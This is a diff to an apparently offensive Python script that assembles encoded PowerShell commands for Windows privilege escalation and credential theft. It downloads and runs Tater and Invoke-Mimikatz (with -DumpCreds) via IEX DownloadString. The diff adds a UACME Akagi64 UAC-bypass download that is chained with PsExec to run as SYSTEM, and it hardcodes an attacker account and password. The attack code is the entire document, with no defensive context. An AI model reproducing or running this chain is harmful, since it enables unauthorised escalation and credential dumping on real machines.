@@ -19,7 +19,7 @@ url_psexec = "https://github.com/jbarg/windows_sec/blob/master/sysinternals_exe/
 url_tater = "https://raw.githubusercontent.com/jbarg/Tater/master/Tater.ps1"
 url_mimikatz = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
 
-
+url_akagi64 = "https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe?raw=true"
 
 
 command = "cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc "
@@ -32,21 +32,25 @@ powershell_command += "IEX $browser.DownloadString('" + url_tater + "'); Invoke-
 
 # download sysinternals psexec
 powershell_command += "IEX $browser.DownloadFile('" + url_psexec + "','C:\\ProgramData\\psexec.exe');"
+powershell_command += "IEX $browser.DownloadFile('" + url_akagi64 + "','C:\\ProgramData\\akagi64.exe');"
 
 
 
 # run command as user: attacker
+command_attacker += "C:\\ProgramData\akagi64.exe 3 "
+command_attacker += "\"cmd /c C:\\ProgramData\\psexec -i -s "
+command_attacker += command +"\""
 admin_cmd = "$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;"
 admin_cmd += "IEX $browser.DownloadString('" + url_mimikatz + "'); Invoke-Mimikatz -DumpCreds"
 
 admin_cmd_b64 = cmd_to_base64(admin_cmd)
 print "Mimikatz cmd:\n\n"
-print command + " " + admin_cmd_b64
+print command_attacker + " " + admin_cmd_b64
 print "---------------------------------"
 
 
 
-powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command + " " + admin_cmd_b64
+powershell_command += "C:\\ProgramData\\psexec.exe /accepteula -i -u attacker -p Test123! " + command_attacker + " " + admin_cmd_b64
 
 print "-------------------------------------------------"
 
